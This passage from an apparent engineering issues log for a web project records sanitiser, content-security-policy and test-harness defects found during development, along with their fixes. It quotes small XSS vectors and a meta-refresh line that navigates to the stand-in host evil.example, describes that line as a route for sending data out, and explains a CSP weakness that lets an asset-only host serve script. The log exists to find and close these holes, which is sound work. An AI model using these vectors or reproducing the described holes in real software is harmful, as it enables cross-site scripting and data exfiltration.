anywhere in this plan defines** — the series contract is W25's `window.__WOLF_SERIES__` and nothing else. Removed and replaced with the general argument. **The profile is now executed against `isomorphic-dompurify ^2` — extracted from this document, run over a 20-vector corpus — and is all green: prose survives, every vector strips, all idempotent.** ⚠️ **The lesson is the sharpest yet on the R102/R105/R108/R117 theme: the defects were not in reasoning but in library semantics, and no amount of review would have found them — running the config found three in one command.** Where a pinned literal is a *configuration of someone else's library*, pinning it without executing it is not a decision, it is a guess wearing a decision's clothes. | **Resolved** — all four fixed and verified |
| **R121** | **Two more dangling references of the R116 class, found the same way — an executor reading forward.** (1) The file-ownership table's `api/src/report/*` row read *"See the report-layer sub-graph"*, and **no section of that name exists** — `grep -n "sub-graph"` over the whole file returns that one line. So the ordering rule for the tickets sharing that directory was a pointer to nothing. Worse, the wildcard implied a serialisation they do not need: **each of those tickets creates its own file**, so W17, W18 and W20 were always free to run concurrently once W16 landed. Row rewritten to name the seven files and their owners explicitly. (2) **W20's criterion 2** ("drift is reported per hypothesis, so the UI shows one indicator") is **not literally satisfiable inside W20**: its Scope is a pure function and its Files line permits only `drift.ts` + test, so the module has no hypothesis identifier and per-hypothesis aggregation is W22's job. W20's verifier graded the sane reading — one indicator per (template, latest-report) pair — and flagged the wording. **Same family as R102/R105/R108/R117; that is now six.** | **Resolved** (the row) / **Open** (W20's wording, cosmetic) |
| **R122** | **The R112 fold had one satisfiable implementation and the plan did not say so, which is a lesson about how tightly a criterion can be specified before it over-determines the code.** "W9's existing teardown-order test must still pass unchanged" plus "the exclusion is a delivery read" are jointly satisfiable **only** if the exclusion reuses a page the drain already fetched: that test's ordered filter is `step.startsWith("DELETE") || step === "GET /agent/deliveries"`, so **any** second delivery request appears in the sequence and fails it, wherever it is placed. The implementer found the one path through, and a test now pins it (*"the in-flight exclusion costs NO extra request — the drain's own page answers it"*). The consequence, recorded as the wave's two **minor** defects: the drain's read moved from server-side `?status=pending` to one **unfiltered** page split client-side, with the limit raised 200 → Orange's 1000 ceiling, and neither the drain nor the sweep loops on offset — so a project with more than 1000 deliveries newer than a pending one would still miss it. Rows come back `created_at DESC` so in-flight rows sort first, which bounds it in practice. Also: the 404-skip path asserts the two substantive halves but **not** that its log line is emitted, so a refactor could make an operator-visible skip silent with every test green. | **Open** — offset paging on both delivery reads |
| **R123** | **wolf-api now builds TWO Orange clients and TWO hypothesis stores per process.** `createApp(logger, config)` returns only the Express app, and `app.ts` is owned by other tickets (W1/W7/W8/W11/W21), so `index.ts` cannot reach the app's instances and the poller constructs its own. W10 closed the resulting transition race by making the store's `KeyedMutex` **module-scoped** — which also, incidentally, is the durable answer to **R107** (the mutex was per-instance and assigned to nobody). The duplication itself is a smell, not a bug: the clean fix is `createApp` accepting or exposing the store, and it belongs to whichever ticket next legitimately owns `app.ts` (**W11** or **W21**). ⚠️ Note the shape of this one: a *file-ownership rule* produced a *runtime architecture*. Worth remembering when the next ticket's Files line looks arbitrarily tight. | **Open** — fold into W11 or W21 |
| **R124** | **Two hand-off notes for W22, both cheap to honour and expensive to discover late.** (1) `store.ts`'s `ReportTemplateRecord` carries `{memoryId, hypothesisId, structureHash, html, createdAtMs}` and **not** `slotIds`, so whichever ticket first wires `detectDrift` into a route must re-run W16's `parseTemplate(html, maxBytes)` on the stored HTML to recover them. (2) Per-hypothesis request cost per tick at the 300s default is roughly **8–10 requests against agentd, 288 times a day, per hypothesis**, and the poller calls `store.readBoard()` every tick — the single most repeated read in the system, because `readBoard` is the one call whose resolver already applies the retraction rules and duplicating that logic was judged not worth it. Neither is a defect at the scale this product is being built for; both are the first things to look at if the stack feels slow. | **Open** — informational, for W22 and any perf pass |
| **R137** | 🔴 **`docker build -f web/Dockerfile .` was broken on agent-wolf `main` for two commits and neither gate could see it.** W28 added the vendored `@agentkit/chat-ui` tarball (`web/package.json` → `file:./vendor/agentkit-chat-ui-0.1.2.tgz`) but the Dockerfile's build stage copies only the four workspace `package.json`s before `RUN yarn install --frozen-lockfile`; `COPY web ./web` lands on the *next* line. So every image build died with `error "./web/vendor/agentkit-chat-ui-0.1.2.tgz": Tarball is not in network and can not be located in cache`. **W28's Validation was `yarn test` + `yarn typecheck` + `yarn build`, and not one of the three can see this class of failure** — they all run against the already-installed workspace, which has the tarball. W13's verifier reproduced it independently from a `git archive main` scratch copy (exit 1) before accepting W13's fix. `web/Dockerfile` is on W13's Files line, so the one-line fix (`COPY web/vendor ./web/vendor`, before the install) landed with W13 and `main` builds again. ⚠️ **This is § "The Validation rule" failing for the twelfth time in a new costume: a ticket whose criteria include "installed from a local tarball under `web/vendor/`" was gated by three commands, none of which performs an install from a clean tree.** The general rule this suggests: **any ticket that changes how a dependency is resolved must have a Validation command that installs from scratch** — a container build, or `rm -rf node_modules && yarn install --frozen-lockfile`. Related: **R134** (yarn's cache lies about `file:` tarballs) is the same blind spot seen from the other side. | **Resolved** (W13) / **Open** (the "installs from clean" Validation rule) |
| **R138** | **The board's tier contract was pinned in W27 and needed by W13, and nothing pointed one at the other.** W13 renders an attention queue whose tiers are *"computed server-side"* by **W27, which is unbuilt** — so the executor had to invent both the wire names and the behaviour when they are absent. The names in fact exist, in W27's own acceptance criteria (`attention_tier` ∈ `needs_human｜watch｜in_interview｜holding`, plus `attention_count` and `stale_count`, **absent stays absent**) and in W22's (`headline: string \| null`), but W13's executor is told to read only its own ticket. The orchestrator supplied them in the brief and ruled three things, now binding: (1) W13 declares the full row type and drives every test from **fixtures**; (2) 🔴 **the tier is never computed client-side** — mutating a row to `attention_tier:"holding"` while `status:"challenged"` must leave it in HOLDING, or the attention model lives in two places, the same defect class as putting the go-live validator in the browser; (3) 🔴 **no chronological fallback** — a row whose tier is absent or unrecognised renders in **NEEDS A HUMAN** with a visible caption, following the plan's own standing doctrine that *an anomaly is RENDERED, never dropped*. **Three hand-offs W27 must honour:** W13 filters terminal statuses (`confirmed`/`invalidated`/`archived`) off the board **client-side** per § 3, so W27's "everything else → HOLDING" rule need not and should not also filter; `restated_from` is **not** on `BoardRow`, which forces `/archive` into one detail read per terminal row (bounded by conclusions, not by days — the one-line fix belongs in `boardRow`); and W27 should confirm the token wording, since § 4's mockup shows `1 indet.` which is `conditions_summary.indeterminate`, not `attention_count`. ⚠️ **The general shape: a criterion that says "computed by ticket N" is unexecutable by an executor forbidden to read ticket N.** Either restate the contract in both tickets or accept that the orchestrator must carry it across in the brief — this plan now does the latter deliberately. | **Resolved** (W13) / **Open** (three hand-offs to W27) |
| **R139** | **The below-`md` branch of every responsive component is invisible to the test suite, and it fails silent.** `useMediaQuery` returns `false` under jsdom because nothing defines `window.matchMedia`, so `ChatRail`'s tab branch — a **stated acceptance criterion** in both W13 and UI design § 5 (*"it never becomes a fixed-height box in the middle of a scrolling document"*) — was never executed by any of the 190 tests. W13's verifier gave that branch `height: 800px` and **the whole suite stayed green**. Closed in the fix round with a locally-stubbed `matchMedia` and an assertion on a `data-rail-mode` marker that proves the branch ran, plus the no-fixed-pixel-height property; the mutation now fails with `expected '800px' not to match /px/`. ⚠️ **This applies to every remaining UI ticket.** W14, W23 and W24 all have responsive criteria, and each will be tested only in the desktop branch unless it stubs `matchMedia` — with no failure to warn them, because the untested branch is the one that does not run. **Any criterion phrased "below the `md` breakpoint …" needs a stub, and the ticket's `TDD: no for layout` carve-out does not cover it — that carve-out is about appearance, and this is about which code path executes.** | **Resolved** (W13) / **Open** (a standing instruction for W14, W23, W24) |
| **R140** | **An absent `spec_validation` did not fail open or closed — it threw during render and took the detail page down.** The go-live gate is deliberately `spec_validation.valid === false` and not `!valid`, so that an **absent** field cannot read as invalid (W9's `422` is the backstop). The verifier's mutation to `?.valid !== true` stayed **green**, because no fixture ever omitted the field. Adding one produced `TypeError: Cannot read properties of undefined (reading 'valid')` **inside render**, which under React unmounts the tree: a payload missing one optional field would blank the whole page rather than degrade. Fixed with optional chaining at the two read sites, **prop type left non-optional** — this is defence against the wire, not a widened contract — and both fixtures now assert the button stays **enabled**. ⚠️ **The lesson is about what a mutation that stays green actually tells you.** `M13` and `M14` looked like the same finding ("nothing distinguishes `!valid` from `=== false`"); `M13` was benign over a `boolean` domain, and `M14` was hiding a crash. **A green mutation is not "the code is fine, the test is thin" — it is an unexplored input, and the only way to know which kind it is, is to write the fixture.** | **Resolved** (W13) |
| **R141** | **UI design § 2 contradicts itself on `titleTruncated`, and the more specific column is the right one.** The ten-signal table maps it to Channel S `degraded`, whose treatment is defined two tables earlier as *"a `warning`-toned inline marker **plus a sentence naming the cause**. Never a bare icon."* — but the same row's own **Rendered as** column says *"an ellipsis affordance; the UI never claims the title is complete"*, which is not a `degraded` treatment and carries no sentence. W13 followed the Rendered-as column, and its verifier agreed: a mandatory cause sentence on every one of twenty board rows destroys the 40px density § 2b principle 4 demands, and a truncated title is not a reliability problem — it is a display limit the UI must not paper over. **Resolution (orchestrator, 2026-08-24): `titleTruncated` is Channel S `none` on the board, rendered as an ellipsis affordance; the `degraded` sentence belongs on the DETAIL page**, where the full title is available and one sentence costs nothing. § 2's table is amended accordingly and W14 carries the detail-page half. ⚠️ Note the shape — this is **not** the R102/R105/R108/R117 family of dangling references, but a *self-contradiction inside one table*, produced when a summarising column and a prescribing column were written in the same pass. It survived the UI design's own adversarial review, and only building a screen against it surfaced it. | **Resolved** — § 2 amended, detail half assigned to W14 |
| **R142** | **W14's ticket enumerated four `indeterminate` reasons, one of which does not exist and two real ones missing — and R67 had already corrected exactly this on 2026-08-21 without the correction reaching the ticket that consumes it.** W14 names `stale_series` \| `non_positive_reference` \| `insufficient_coverage` \| `no_observations`. W4's actual exported union (`api/src/hypothesis/evaluate.ts:64-71`) is `condition_tripped` \| `insufficient_coverage` \| `non_positive_reference` \| **`stale_data`** \| `no_observations` \| **`no_ratio_pair`** — six values, and `stale_series` is not among them. **R67 recorded the `stale_data` spelling three days earlier**; the log was updated and the ticket was not. W14's implementation renders any token **verbatim** through one gloss table (`web/src/reasons.ts`), which satisfies the criterion's actual intent and handles `stale_series` correctly if it is ever emitted — so nothing shipped wrong. Two neighbouring field-name errors in the same ticket, both confirmed against the code: `ConditionResult` carries **`window_start_ms`/`window_end_ms`**, not `window_start`/`window_end`; and **`statistic` is not on the evaluation at all** — it is `Condition.stat` on the *spec*, so the page must join by condition id (W14 does, via a `statFor` callback, and the join is now tested — it was one of the seven mutation escapes). ⚠️ **This is the R94 family from a new angle: not a Files line short of a file, but a Discovered-Issues correction that never propagated into the ticket it corrects.** The log is closer to the code than the tickets are, and the tickets do not know it. **Worth one sweep before W23: grep every pending ticket's enumerated vocabularies against the code's actual exported unions.** | **Open** — the sweep |
| **R143** | 🔴 **Two of W14's acceptance criteria are unbuildable because `GET /api/hypotheses/:id` does not project the fields they need, and both are the same one-line gap.** (1) *"A `challenged` hypothesis shows the reason (`condition_tripped` \| `horizon_reached`) taken from the trusted `hypothesis` memory's snapshot."* W10 **writes** it — `api/src/hypothesis/poller.ts:466-480` puts it in the state transition's `rationale` — but `detailRow()` (`api/src/routes/hypotheses.ts:714-729`) projects exactly ten fields plus `tamper`, and the rationale is not one of them. (2) *"`Timeline` renders **state changes** from the `hypothesis` memories"* (plural): the same projection returns one `status` + one `status_memory_id` + one `updated_at_ms` — the **current** row only, never the walk. **W14 refused to paper over either**, and the verifier upheld that: deriving the challenge reason from the tripped-condition rows puts the reason in two places and is **actively wrong for a horizon-challenged hypothesis whose conditions trip afterwards**, while a default prints a reason nobody recorded. So `challenge_reason` is declared optional, rendered verbatim when present, and its absence renders a pinned sentence — with a test asserting the UI does **not** derive it. `api/src/routes/hypotheses.ts` is on the ownership row and **W27 holds it next**, so W14 touching it would also have broken the serial rule. **W27 must carry a rider projecting both**: the state memory's `rationale` as `challenge_reason`, and the state-change history for the timeline. That rider now joins the two already queued there (`restated_from` on `BoardRow`, and the three tier hand-offs of **R138**) — four projections, one file, one ticket. ⚠️ **The general shape: a UI ticket's criteria were written against the memory bus rather than against the HTTP projection of it, and nothing checks that the two agree.** Every remaining UI criterion phrased "taken from the `<kind>` memory" deserves the same check before its ticket is cut. | **Open** — W27 rider |
| **R144** | **A source file was BINARY and every gate stayed green.** A stray NUL byte landed in `web/src/components/MetricCharts.tsx` as a `join()` delimiter during authoring; git classified the file as binary (`Bin 0 -> 5776 bytes` in the diff) and **`yarn test`, `yarn typecheck` and `yarn build` all passed anyway**. The verifier confirmed the mechanism: `tsc` and `vite` both accept a NUL inside a comment, vitest never looks, and git's binary classification surfaces only if a human reads `git diff`. A byte-level scan of all 190 tracked files found the only NUL-bearing file to be the legitimately-binary vendored tarball. **Closed in W14's fix round** with a `describe("every source file is text")` block in `web/src/build-variables.test.ts` that reads each source file as bytes and flags anything below `0x20` other than tab/LF/CR, plus `0x7f` — **paired with a temp-file regression that writes a real NUL and asserts the predicate fires**, because a scan that has never fired is a green line, not a check. ⚠️ **The class this belongs to: our gate checks what the code *means* and never what the file *is*.** Encoding, line endings, BOMs and control characters are all invisible to it. | **Resolved** (W14) |
| **R145** | **Two guards in `web/`'s own test suite are text-matchers pretending to be import checks, and both misfire on prose.** (1) `build-variables.test.ts`'s validator guard grepped **raw file text** for `validateSpec\|hypothesis/spec`, so a doc *comment* citing that path failed the boundary — which taught W14's implementer to reword its own documentation ("the API's `spec.ts`") rather than name the file properly. **A comment is not an import.** Fixed in W14's fix round by stripping comments before the regex, with regressions proving a real import (static, dynamic and re-export forms) is still caught while a JSDoc block and a line comment are not — and **the three obfuscated doc comments were then restored to name `api/src/hypothesis/spec.ts` properly**, so the narrowed guard has live subjects. (2) Separately, **`import-boundary.test.ts`'s own specifier regex has no word boundary and no notion of a string literal**: `/(?:import\|export)(?:[^'"`()]*from)?\s*["'`]([^"'`]+)["'`]/g` will parse a **test title ending in the word "import"** as a module specifier, because the word sits directly against its own closing quote. W14 hit it authoring a fixture and got a violation naming a nonsense package — which reads as a bug in the checker rather than in the code. **This is the third time that suite has failed against source text that is not an import**; it is worked around by assembling the keyword from parts (the same dodge the suite already uses for its own `.jsx` case). ⚠️ **The lesson: an over-broad text guard does not enforce a boundary, it trains authors to obfuscate — and the obfuscation is invisible to review while the guard still reads as green.** | **Resolved** (1) / **Open** (2, the specifier regex) |
| **R146** | 🔴 **W30 shipped a FAIL-OPEN hole in the channel it exists to close, and 203 tests could not see it.** `metaRefreshUrl` required `;` or `,` after the refresh time. The HTML Standard's shared declarative refresh steps — **which the function's own docstring cites** — say at step 9.1 that the separator may be `;`, `,` **or ASCII whitespace**, and step 5 makes a lone `.` a time of zero. So `<meta http-equiv="refresh" content="0 https://evil.example/x">` **navigates in a real browser** and contributed **no origin**. The consequence is exactly the R118(2) failure the ticket was written to close: W24 shows the approving human **zero hosts**, and the fetch is not blocked either — the frame's sandbox (`allow-scripts`, no `allow-top-navigation`) permits it to navigate *itself*, while W19 substitutes origins into `script-src`/`style-src`/`img-src`/`font-src`, **none of which govern a navigation**. A template exfiltrating via meta-refresh would be approved by a human who was never shown the host. 🔴 **How it hid is the transferable part: the mutation that FIXES it stayed green on all 203 tests, because both "no separator" fixtures in the suite failed the *time* test first.** That is the **third** non-discriminating fixture in one wave — the implementer caught two itself (a `meta content=` case that died at a different rule, and a `ping` fixture whose separator survived the transform under test) — and it is why the standing verifier instruction is now *check **why** a test goes red, not just that it does*. Fixed by implementing the spec's steps rather than an approximation of them; the verifier then probed **49 spellings** and found no under-acceptance left, with three partial-keyword spellings now **stricter** than a browser (fail-closed, accepted). Reverting the fix reddens **8 independent assertions**. ⚠️ Related and still open for W19: `frame-src` and `form-action` are absent from the CSP skeleton entirely, and an origin that is only ever *navigated to* currently becomes a permitted **script** source. | **Resolved** (W30) / **Open** (the W19 note) |
| **R147** | **R120(1)'s rationale was stale, and its staleness was itself the hazard — found by measuring all four combinations rather than reading the profile.** The pinned `SLOT_PROFILE` comment said `#text` is "LOAD-BEARING and must stay first". W17 measured it: with **`KEEP_CONTENT: true`** — which the profile sets, per R120(2) — **DOMPurify adds `#text` itself** (`dompurify/dist/purify.cjs.js:916-918`), so removing `#text` today changes nothing and mutation-testing it reddens **only the literal pin**. Only the combination (`#text` absent **and** `KEEP_CONTENT: false`) produces R120(1)'s empty-prose failure. **So R120(1) and R120(2) defend the same failure, not two** — R120(1) was observed against the *pre*-R120(2) draft, where `KEEP_CONTENT` was still `false`. 🔴 **The hazard is the inertness:** the next editor who mutation-tests `#text`, finds it dead and deletes it removes nothing today and re-opens a **blocking** defect the moment anyone revisits `KEEP_CONTENT`, which *looks* like the safer setting. The profile comment now says the two entries **move together** and names the library line; the value is unchanged. W17 pinned the interaction with the one test in the module that calls DOMPurify directly, justified in a comment, because the claim is about library behaviour under variants `sanitiseSlot` cannot express. ⚠️ **The general shape, and it is new: a correction can be right about the VALUE and wrong about the REASON, and the wrong reason survives review because the value is right.** R120's own lesson was "execute a pinned configuration rather than reading it"; this is that lesson applied to a correction R120 itself made. | **Resolved** — profile comment amended |
| **R148** | **Three redundant guards in one file, and the rule that separates documentation from debris.** W30's mutation passes found `origin === "null"` (unreachable behind an earlier scheme test), `(?:-webkit-)?image-set\(` (inert — `image-set(` already matches as a substring) and `if (rest === "") return undefined` (unreachable as a distinct outcome). The implementer's own account is the finding: **none was sloppiness — all three were written deliberately, to make an invariant legible in a place where the invariant was already enforced upstream.** Documenting through code instead of through a comment. 🔴 **Two were harmless and the third was not, and the difference is precise: a redundant guard is inert until it sits on the SAME input path as the real check, and then it silently converts a load-bearing line into an untested one.** The `null` guard masked the scheme test, so the one line actually holding that boundary was never exercised and a mutation of it stayed green — the guard was manufacturing false coverage for the check it duplicated. **The rule: if a guard cannot be made to fail on its own, it is a comment — write it as one.** The detection method is the one that found all three: mutate the guard, and if nothing reddens, decide **deliberately** whether it is documentation or debris (`rest === ""` was kept as documentation; the other two were removed). ⚠️ **The generalisable half, and it reframes what mutation testing is for in this project: mutation finds DEAD CODE as reliably as it finds missing tests — and the dead code it finds next to a real check is the more dangerous of the two.** Every prior entry here treated mutation as a way to find weak tests; this is the first time it found code that should not exist, plus the mechanism by which that is worse. | **Resolved** — rule recorded |
| **R149** | 🔴 **The worst possible slot in the product showed a human NOTHING — a security-visibility hole in the pinned profile, closed by owner ruling.** Without `FORCE_BODY`, DOMPurify parses slot content in *document* context and returns only `<body>` (`WHOLE_DOCUMENT: false`), so content that **begins with** `<script>`, `<style>`, `<link>`, `<meta>`, `<base>`, `<title>` or `<template>` is hoisted into `<head>` **by the parser** and never reaches the sanitiser. The output was already safe — but `strippedCount` was **0**, and W23 gates its `Severity level="degraded"` notice on `stripped_count > 0`, so `<script>alert(1)</script>` alone rendered as an empty region with **no notice at all**. W17 measured it and **declined to close it unilaterally** — correct, since the profile is byte-for-byte pinned — pinning the gap with a named KNOWN-GAP test instead. `FORCE_BODY: true` was added to the profile by owner ruling on 2026-08-26. **Three things came out of the fix, and two were unforeseen.** (1) 🔴 **It restored a `FORBID_CONTENTS` defence the parser had been routing around**: in document context a `<noscript>` lands in `<head>` **empty** and its child falls into `<body>` alone, so `FORBID_CONTENTS: ["noscript"]` **never fired**. Exactly one of 79 outputs changed (`'<p></p>'` → `''`), and the verifier's precision is worth keeping — the payload was already neutralised by a *different* library defence (`SAFE_FOR_XML`'s attribute regex), so this **restored defence-in-depth rather than closing a live hole**. (2) `FORCE_BODY` prefixes a literal `<remove></remove>` and the library force-removes `body.firstChild` **before** the walk, so `DOMPurify.removed` gains a **second** manufactured record — and a **third** for empty input, because the library substitutes `dirty = '<!-->'`. Uncorrected, clean prose would have reported **2 items removed** and every healthy report would have carried a warning. The skip is ordered, at-most-one-of-each, and gates the comment on the input genuinely being empty, so a model-authored `<remove>`, `<body>` or comment still counts — verified in both directions. (3) That is **three separate undercounts** this ticket produced (the `<body>` walk root, head-absorption, the sentinel), **each of which looked like a sensible simplification from the outside**. ⚠️ Standing note for W23, which renders this number to a human: `strippedCount` counts DOMPurify *records*, so a library upgrade moves it with no behaviour change — **the sign is the contract; the magnitude is not.** Render it magnitude-agnostically. And the decisive argument for counting attributes as well as nodes: `<p onclick="alert(1)">analysis</p>` removes **no element at all**, so a node-only counter reports a live XSS attempt as "nothing was removed". | **Resolved** (W17) / **Open** (W23's wording) |
| **R150** | **Three residues the sanitiser leaves, found only by an 8,600-input adversarial sweep whose oracle was a jsdom RE-PARSE rather than token matching.** None is exploitable; all three are recorded because each contradicts something the design says or implies. (1) 🔴 **`is=""` survives — an attribute NOT on `ALLOWED_ATTR` reaches the output.** DOMPurify deliberately *voids* `is` rather than removing it (`purify.cjs.js:1262-1270`), so `<p is="x-evil" onclick=alert(1)>x</p>` yields `<p is="">x</p>`. Harmless (a custom element cannot be named `""`, and a slot can define no script) — but the design's stated invariant *"everything a slot may contain is on `SLOT_PROFILE`'s allow list"* is **not literally true**, and re-sanitising that output reports `strippedCount: 1` **again**, so **the HTML is a fixed point while the count is not**. (2) **Non-idempotence outside the vector table**: five `<p>`-wrapping-a-disallowed-block shapes converge only at pass 2 (`<p><object></p>` → `<p><p></p></p>` → three empty `<p>`s). Nothing dangerous rides it and the criterion is scoped to the vector table, where it holds — but the ticket's own rationale calls non-idempotence an mXSS smell. (3) ⚠️ **Hand-off to W19/W25 — raw-text slot elements.** `validateTemplate` **accepts** a slot declared on `<style>`, `<title>`, `<textarea>` or `<xmp>`, and sanitised output is only safe in *element-content* context, so such a slot is a breakout site. The end-to-end exploit was built and **failed** — but only because DOMPurify's `SAFE_FOR_XML` attribute regex covers those exact elements. **The path is closed today by the library, not by anything W16, W17 or W30 wrote**, which is precisely the kind of dependency that stops being true on an upgrade. W25's authoring contract should forbid a slot on a raw-text element, or W30's validator should refuse one. Related: F3, also W25's — `sanitiseSlot` parses in body context and cannot know its slot sits in a `<tbody>`, so `<tr><td>…</td></tr>` in a slot **loses its tags to the parser**, keeps the text, and reports `strippedCount: 0`. Silent. | **Open** — (3) and F3 → W25 or W30 |
| **R151** | **The seventeenth instance, and this one was in a hand-off note written to warn about exactly this class.** W19's Notes, written by the orchestrator at the close of wave 11, opened with "🔴 `frame-src` and `form-action` are absent from the CSP skeleton entirely". Both are present in `design/2026-08-24-agent-wolf-ui.md` § 6b, both as `'none'`, alongside `child-src`, `object-src`, `manifest-src`, `media-src` and `worker-src`. Had it been dispatched, an implementer would have "fixed" a policy that was already correct and moved attention away from the defect that is real. The defect the note was *reaching for* is R152. Two things generalise. (1) **A hand-off note is written at the moment of least context about its destination** — the orchestrator has just spent a wave inside the *producer* (W30's URL walker) and writes the note pointing at a *consumer* section it has not re-read since revision 5 rewrote it. The fix is mechanical and now standing: **before dispatch, re-read every section a ticket's Notes name and check the claim against the text, not against memory.** (2) The note was *directionally* right and *factually* wrong, which is the shape R147 named — a correction can be right about the value and wrong about the reason, and here it was right about the risk and wrong about the mechanism. The risk survived the error; a worker following the letter would have lost it. |
| **R152** | 🔴 **§ 6b's single `<ORIGINS>` placeholder grants script execution to hosts that only ever receive a fetch or a navigation — the CSP substitutes TWO lists, not one.** `remoteOrigins` is deliberately the superset: W30 pushes into it from `meta[http-equiv=refresh]` targets and `object > param` values as well as from `src`/`href`/`srcset`/CSS `url()`. § 6b then substitutes that one list at all four of `script-src`, `style-src`, `img-src` and `font-src`. So a template whose only mention of `cdn-images.example` is an `<img>` — or whose only mention of `evil.example` is a meta-refresh — makes both a **permitted script origin**. With `'unsafe-inline'` already granted (and it must be, the chart code is inline), the template's own inline script can then `document.createElement("script")` against a host the reviewing human filed under "images". The bound § 6b sells — *"the hosts a human approved for this template"* — is real, but it silently erases the distinction between approving a host **as code** and approving it **as an asset**, which is the exact distinction `scriptSrcs` was built to carry and which R118 made W30 compute. **Ruled 2026-08-26, amending § 6b:** `script-src`/`style-src` take the sorted, deduplicated origins of **`scriptSrcs`**; `img-src`/`font-src` take **`remoteOrigins`**. No W30 change — both lists already ship. The invariant that makes it safe is that `scriptSrcs`' origins are a **subset** of `remoteOrigins`, which is also what W24's "everything else" set difference depends on, so W19 asserts it directly rather than assuming it. Note the residual, recorded rather than papered over: a **stylesheet**-only host still gains `script-src`, because `scriptSrcs` mixes scripts and stylesheets in one array with no channel tag. Splitting that is a W30 change and a future hardening. The general lesson is the one R146 keeps teaching from the other end: **when a producer is deliberately widened to a superset, every consumer that was written against the narrow list must be re-derived, not re-pointed.** W30 widened the inventory for a *human review screen*; the CSP consumer inherited the widening for free and got weaker for it.
| **R153** | 🔴 **A mutation harness that cannot go red is the same defect as a test that cannot — R146, applied one level up.** W19's implementer ran its first five mutations with `vitest run --reporter=basic`. That flag does not exist in **vitest 4**: the run crashed loading a reporter module, the harness grepped the crash text for a failure marker, found none, and reported **GREEN — mutation survived** five times. Every one was red on re-run under exit-code detection. Three things generalise. (1) **Grep the exit code, never the output.** A test runner has three outcomes — pass, fail, *did not run* — and text matching collapses the third into whichever of the first two the pattern happens to miss. It fails in the direction that manufactures confidence: a harness that cannot execute reports a clean bill of health for code it never loaded. (2) **The harness needs its own control.** W19 later ran two: deleting the injection escape and bypassing the sanitiser, each producing a specific, counted failure signature from the live oracle. A sweep that has never been seen to fail is indistinguishable from a sweep that cannot. (3) The same shape appeared twice more in the same ticket and was caught both times by asking R146's question. `M19` (move the injection to the first child of `<head>`) reddened **seven** tests; on inspection the edit had mangled the file, and the honest mutation reddens exactly **two**. `M10+M12` exists only to separate two rules that both fire on the same fixture — without deliberately disabling the superset invariant, there was no way to tell whether the `data:` row was caught by the CSP string assertion or by the invariant throwing first. **A red you have not attributed is not evidence.** |
| **R154** | 🔴 **W21 and W22 both cite plan sections that DO NOT EXIST, and the only copies live in the document that was marked superseded this morning. Blocking for wave 13.** W21's Scope says "The three routes in § 'HTTP routes added'"; W22's criteria say "exactly as pinned in § 'The detail route's report block, pinned'". Neither section is in `design/2026-08-20-agent-wolf.md`. Both are in `design/2026-08-21-agent-wolf-report-layer.md` (lines 404 and 389) — folded into revision 4 as *tickets*, while these two *reference* sections were left behind. This is **R116 exactly**, the defect that blocked W17 and W19, recurring on the next two unbuilt tickets: an executor greps `design/`, finds exactly one answer, and it is inside the file whose banner tells them it is not a source of truth for any value. Worse than R116 in one respect — R116's sections were merely stale, these are **absent**, so an executor told "you do not need to read anything outside this document" has been handed a ticket that cannot be executed from it. The general rule the fold should have followed and did not: **when a document is folded, its reference sections move with its tickets, and the fold is checked by grepping every surviving `§ "…"` citation against the destination's own headings.** That check is mechanical, has never been run, and would have caught this on the day. **CLOSED 2026-08-26, same day.** Both sections were authored into the main plan (§ "HTTP routes added" and § "The detail route's report block, pinned"), reconciled against the code as merged rather than copied — the old copies predate `composeFrame`'s return shape, `drift.ts`'s null convention and the derived CSP, and carried none of the four route notes W21 actually needs. **And the mechanical check was written and run across the whole document**: normalise every `§ "…"` citation and every heading, prefix-match one against the other. 53 citations; **three dangling**, not two. The third was W26 citing § "Amendments to existing tickets", the *other* reference section left behind by the same fold — found only by the grep, exactly as predicted, and fixed in place since that section is genuinely obsolete. One further dangling citation remains and is deliberately left: R67 cites § "The graded rule set", which has never existed here; it is a rationale reference inside a log entry, not an executable instruction. Two citations resolve to `README-stack.md` and are correct. 🔴 **Run this grep at every future fold and before every wave cut** — it takes seconds, it has now caught three defects in one pass, and it is the only check in this project that can prove a ticket is executable from the document its executor was told is sufficient. |
| **R155** | **`scriptSrcs` is not `https:`-only, so the obvious mapping to a CSP source list emits a HOST NAME called `null`.** R152's ruling said `<CODE>` is "sorted, deduplicated `new URL(u).origin` over `scriptSrcs`", and § 6b claims the validator "requires every one to be `https:`". Both are wrong, measured against the merged `parseTemplate`: `<style>@import url(data:text/css,x)</style>` **validates clean** and pushes `data:text/css,x` into `scriptSrcs`, because a `data:` URL in CSS is an image or a font and the CSS channel allows it. `new URL("data:…").origin` is the string `"null"` — and in a CSP source list the bare token `null` is a **host name**, not the keyword `'none'`, so the literal recipe emits `script-src 'unsafe-inline' null`. Separately, `<script src="https:">` also validates (`classifyUrl` reads only the scheme) and `new URL("https:")` **throws**. Two lessons. (1) **A field's guarantee belongs to the channel that fills it, not to the field's name.** `scriptSrcs` reads like "scripts, therefore https", but it is filled from three channels with three different URL policies; the https requirement lives on *some* of them. (2) 🔴 **The superset invariant would have caught the `data:` case by throwing** — R152 instructed W19 to "assert it rather than assume it", and that instruction paid for itself against a defect in the same ruling that issued it. An invariant asserted at runtime is worth more than the reasoning that motivated it, because it survives the reasoning being wrong. |
| **R156** | 🔴 **An unguarded `slots[slot.id]` read puts `function Object() { [native code] }` into a locked report, silently.** `SLOT_ID_PATTERN` is `/^[a-z][a-z0-9-]{0,31}$/`, which **accepts `constructor`** — and `frame.ts` read the day's content off a plain object literal with bracket notation. A template declaring `data-wolf-slot="constructor"` and a tick that never fills it compose to that string rendered as the day's analysis, with `strippedCount: 0`, so W23's degraded notice never fires. It also puts an entry in `strippedBySlot` for a slot that was never filled, destroying the "filled and clean" vs "never filled" distinction the same file's comment says it is preserving and that W20's `DriftResult` depends on. Not XSS — `constructor` is the only `Object.prototype` key matching the id pattern (`__proto__`, `toString`, `valueOf`, `hasOwnProperty` all fail it) and it stringifies without a `<`. Three things generalise. (1) 🔴 **A validated identifier is not a safe property key.** The id pattern was written to constrain what a *human* reads and what a *selector* can express; nothing in it was ever about JavaScript's prototype chain, and the two constraints were silently assumed to be the same one. **Any read of `record[userControlledKey]` needs `Object.hasOwn`, a `Map`, or a null-prototype object** — pattern-validation is not a substitute. (2) **The criterion named the symptom, not the class.** *"never the literal string `undefined`"* is what an author writes after being bitten once by `String(undefined)`; the actual rule is "no JS-level value may ever surface as prose", and the defect walked straight past the narrower wording. When a criterion names a specific bad value, ask what class it is an instance of. (3) The blast radius is the worst available: the template is model-authored and frozen by `structureHash`, so this ships on **every tick** from approval onward and cannot be fixed without an amendment. |
